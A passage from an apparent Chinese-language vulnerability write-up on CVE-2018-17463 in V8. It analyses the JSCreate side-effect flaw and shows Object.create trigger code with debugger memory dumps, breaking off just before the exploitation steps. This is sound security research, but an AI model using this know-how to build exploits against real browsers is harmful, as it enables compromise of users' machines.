                                int expected_additional_properties) {
      if (object->map() == *new_map) return;
      Handle old_map(object->map(), object->GetIsolate());
      NotifyMapChange(old_map, new_map, object->GetIsolate());
      if (old_map->is_dictionary_map()) {
        // For slow-to-fast migrations JSObject::MigrateSlowToFast()
        // must be used instead.
    ... ...
      } else if (!new_map->is_dictionary_map()) {
    ... ...
        }
      } else {
        MigrateFastToSlow(object, new_map, expected_additional_properties);
      }
      // Careful: Don't allocate here!
      // For some callers of this method, |object| might be in an inconsistent
      // state now: the new map might have a new elements_kind, but the object's
      // elements pointer hasn't been updated yet. Callers will fix this, but in
      // the meantime, (indirectly) calling JSObjectVerify() must be avoided.
      // When adding code here, add a DisallowHeapAllocation too.
    }
从而我们找到了经过`JSCreate`操作的数据，是可以被改变的，因此将`JSCreate`认定为`KNoWrite`的确是不正确的。
### 思路验证
关于`JSCreate`操作可以利用`Object.create`函数触发。
> ## 语法
>  
>  
>     Object.create(proto, [propertiesObject])
>  
>
> ### 参数
>
>   * 新创建对象的原型对象。
>
>   * `propertiesObject`
>
> 可选。如果没有指定为 [`undefined`](https://developer.mozilla.org/zh-> CN/docs/Web/JavaScript/Reference/Global_Objects/undefined)，则是要添加到新创建对象的可枚举属性（即其自身定义的属性，而不是其原型链上的枚举属性）对象的属性描述符以及相应的属性名称。这些属性对应[`Object.defineProperties()`](https://developer.mozilla.org/zh-> CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperties)的第二个参数。
>
>
>
> ### 返回值
>
> 一个新对象，带着指定的原型对象和属性。
>
> ### 例外
>
> 如果`propertiesObject`参数是 [`null`](https://developer.mozilla.org/zh-> CN/docs/Web/JavaScript/Reference/Global_Objects/null) 或非原始包装对象，则抛出一个
> [`TypeError`](https://developer.mozilla.org/zh-> CN/docs/Web/JavaScript/Reference/Global_Objects/TypeError) 异常。
通过如下代码可以发现，在执行如下代码后，`Object a`的`map`的确从`fast mode`变成了`Dictionary`
    let a = {x : 1};
    %DebugPrint(a);
    Object.create(a);
    %DebugPrint(a);
    ┌─[p4nda@p4nda-virtual-machine] - [~/Desktop/browser/ctf/CVE-2018-17463/v8/out.gn/x64.debug] - [三 6月 12, 19:23]
    └─[$]  ./d8 --allow-natives-syntax ./test.js 
    DebugPrint: 0x16610e38e1b1: [JS_OBJECT_TYPE]
     - map: 0x0edbef28c981  [FastProperties]
     - prototype: 0x39b5de6046d9 
     - elements: 0x3b84cb382cf1  [HOLEY_ELEMENTS]
     - properties: 0x3b84cb382cf1  {
        #x: 1 (data field 0)
     }
    0xedbef28c981: [Map]
     - type: JS_OBJECT_TYPE
     - instance size: 32
     - inobject properties: 1
     - elements kind: HOLEY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - back pointer: 0x0edbef28c931 
     - prototype_validity cell: 0x372622982201 
     - instance descriptors (own) #1: 0x16610e38e1d1 
     - layout descriptor: (nil)
     - prototype: 0x39b5de6046d9 
     - constructor: 0x39b5de604711 
     - dependent code: 0x3b84cb382391 
     - construction counter: 0
    DebugPrint: 0x16610e38e1b1: [JS_OBJECT_TYPE]
     - map: 0x0edbef28ca21  [DictionaryProperties]
     - prototype: 0x39b5de6046d9 
     - elements: 0x3b84cb382cf1  [HOLEY_ELEMENTS]
     - properties: 0x16610e38e209  {
       #x: 1 (data, dict_index: 1, attrs: [WEC])
     }
    0xedbef28ca21: [Map]
     - type: JS_OBJECT_TYPE
     - instance size: 32
     - inobject properties: 1
     - elements kind: HOLEY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - dictionary_map
     - may_have_interesting_symbols
     - prototype_map
     - prototype info: 0x39b5de623039 
     - prototype_validity cell: 0x372622982201 
     - instance descriptors (own) #0: 0x3b84cb382321 
     - layout descriptor: (nil)
     - prototype: 0x39b5de6046d9 
     - constructor: 0x39b5de604711 
     - dependent code: 0x3b84cb382391 
     - construction counter: 0
## 漏洞利用
### 漏洞触发
当前的漏洞已经可以影响一个`Object`的结构，将其模式修改为`Directory`，但究竟可以影响`Object`哪些位置，还需要进一步探究，首先可以先从`Object`自身结构入手，研究一下在`Object.create`对传入对象的影响。
我们知道，在`JavaScript`中对于一个对象属性的定义有两种，一种是在属性初始化时加入，另一种是在操作中加入，测试代码如下：
    let a = {x : 1,y:2,z:3};
    a.b = 4;
    a.c = 5;
    a.d = 6;
    %DebugPrint(a);
    readline();
    Object.create(a);
    %DebugPrint(a);
    readline();
在第一处`readline`时，可以发现`a`这个`Object`的构造如下：
    pwndbg> v8print 0x31132b18e1e9
    0x31132b18e1e9: [JS_OBJECT_TYPE]
     - map: 0x0bf82a48cb11  [FastProperties]
     - prototype: 0x2e853b0046d9 
     - elements: 0x006338502cf1  [HOLEY_ELEMENTS]
     - properties: 0x31132b18e389  {
        #x: 1 (data field 0)
        #y: 2 (data field 1)
        #z: 3 (data field 2)
        #b: 4 (data field 3) properties[0]
        #c: 5 (data field 4) properties[1]
        #d: 6 (data field 5) properties[2]
     }
    $1 = 0
可以发现，`a`拥有6个属性，其中`b、c、d`标志为`properties[x]`，继续查看这个`Object`的`map`，发现在`map`中指明了整个`Object`的大小是48字节，并存在3个`inobject
properties`也就是保存在结构体内部的属性，且是`[FastProperties]`模式的。
    pwndbg> v8print 0x0bf82a48cb11
    0xbf82a48cb11: [Map]
     - type: JS_OBJECT_TYPE
     - instance size: 48
     - inobject properties: 3
     - elements kind: HOLEY_ELEMENTS
     - unused property fields: 0
     - enum length: invalid
     - stable_map
     - back pointer: 0x0bf82a48cac1 
     - prototype_validity cell: 0x2e853b006459 
     - instance descriptors (own) #6: 0x31132b18e449 
     - layout descriptor: (nil)
     - prototype: 0x2e853b0046d9 
     - constructor: 0x2e853b004711 
     - dependent code: 0x006338502391 
     - construction counter: 0
根据`JS`中对象指针的形式，可以查看这个`Object`的结构，显然我们在`a`初始化中声明的属性值`x,y,z`被保存在结构体内部，且符合`map`中指出的三个结构体。
    pwndbg> x /6gx 0x31132b18e1e8
    0x31132b18e1e8: 0x00000bf82a48cb11  0x000031132b18e389
    0x31132b18e1f8: 0x0000006338502cf1  0x0000000100000000
    0x31132b18e208: 0x0000000200000000  0x0000000300000000
再看`a`结构体中的第二个8字节，在`v8print`中可以看出其指向`properties`成员。
    pwndbg> v8print 0x31132b18e389
    0x31132b18e389: [PropertyArray]
     - map: 0x006338503899 
     - length: 3
     - hash: 0
               0: 4
               1: 5
               2: 6
    $3 = 0
发现在后续操作中添加的`a,b,c`被保存在这里，并且属性值的存储顺序是固定的。
    0x31132b18e388: 0x0000006338503899  0x0000000300000000
    0x31132b18e398: 0x0000000400000000  0x0000000500000000
    0x31132b18e3a8: 0x0000000600000000
而在执行`Object.create`后，可以发现`a`的`map`成员发生了改变，符合我们之前对源码的分析，`Object.create`对输入的`map`进行了优化，改为了`DictionaryProperties`模式：
    pwndbg> v8print 0x31132b18e1e9
    0x31132b18e1e9: [JS_OBJECT_TYPE]
     - map: 0x0bf82a48cbb1  [DictionaryProperties]
     - prototype: 0x2e853b0046d9 
     - elements: 0x006338502cf1  [HOLEY_ELEMENTS]
     - properties: 0x31132b18e4f9  {
       #z: 3 (data, dict_index: 3, attrs: [WEC])
       #d: 6 (data, dict_index: 6, attrs: [WEC])
       #b: 4 (data, dict_index: 4, attrs: [WEC])
       #c: 5 (data, dict_index: 5, attrs: [WEC])
       #y: 2 (data, dict_index: 2, attrs: [WEC])
       #x: 1 (data, dict_index: 1, attrs: [WEC])
     }
    $4 = 0
而再次查看结构体，发现其中保存的`x,y,z`属性值并未存在结构体中：
    pwndbg> x /6gx 0x31132b18e1e8
    0x31132b18e1e8: 0x00000bf82a48cbb1  0x000031132b18e4f9
    0x31132b18e1f8: 0x0000006338502cf1  0x0000000000000000
    0x31132b18e208: 0x0000000000000000  0x0000000000000000
而观察`properties`成员，发现长度发生明显变化，并且之前存在`Object`结构体中的`x,y,z`也进入了`properties`中。
    pwndbg> v8print 0x31132b18e4f9
    0x31132b18e4f9: [ObjectHashTable]
     - map: 0x006338503669 
     - length: 53
     - elements: 6
     - deleted: 0
     - capacity: 16
     - elements: {
               0: 7 -> 0
               1: 0x0063385025a1  -> 0x0063385025a1 
               2: 0x0063385025a1  -> 0x0063385025a1 
               3: 0x0063385025a1  -> 0x0063385025a1 
               4: 0x0063385025a1  -> 0x0063385025a1 
               5: 0x0063385025a1  -> 0x0063385025a1 
               6: 0x0063385025a1  -> 0x0063385025a1 
               7: 0x1a09a4506971  -> 3
               8: 960 -> 0x0063385025a1 
               9: 0x0063385025a1  -> 0x0063385025a1 
              10: 0x0063385025a1  -> 0x0063385025a1 
              11: 0x0063385025a1  -> 0x1a09a45050a1 
              12: 6 -> 1728
              13: 0x2e853b022991  -> 4
              14: 1216 -> 0x0063385025a1 
              15: 0x0063385025a1  -> 0x0063385025a1 
     }
    $6 = 0
而且，其中保存的值也并非顺序保存的，并且结构比较复杂，前0x38个字节代表结构体的`map,length`等成员，后面有0x35项数据，每个数据占16字节，前8字节代表属性名，后8字节代表属性值。
    pwndbg> x /25gx 0x31132b18e4f8
    0x31132b18e4f8: 0x0000006338503669  0x0000003500000000
    0x31132b18e508: 0x0000000600000000  0x0000000000000000
    0x31132b18e518: 0x0000001000000000  0x0000000700000000
    0x31132b18e528: 0x0000000000000000  0x00000063385025a1
    0x31132b18e538: 0x00000063385025a1  0x00000063385025a1
    0x31132b18e548: 0x00000063385025a1  0x00000063385025a1
    0x31132b18e558: 0x00000063385025a1  0x00000063385025a1
    0x31132b18e568: 0x00000063385025a1  0x00000063385025a1
    0x31132b18e578: 0x00000063385025a1  0x00000063385025a1
    0x31132b18e588: 0x00000063385025a1  0x00001a09a4506971
    0x31132b18e598: 0x0000000300000000  0x000003c000000000
    0x31132b18e5a8: 0x00000063385025a1  0x00000063385025a1
    0x31132b18e5b8: 0x00000063385025a1
    pwndbg> v8print 0x00001a09a4506971
    #z
    $9 = 0
至此，我们大致可以将`Object.create`对一个`Object`的影响搞清了，该结构会把全部的属性值都放到`properties`中存储，并将原先的线性结构改成`hash`表的字典结构。
回到漏洞，如何将这个`side-effect`推断错误的影响扩大化呢？一般的想法是利用优化来去掉一些检查的节点。
例如代码：
    function foo(o) {
            return o.a + o.b;
        }
其生成的`IR code`可能是如下的：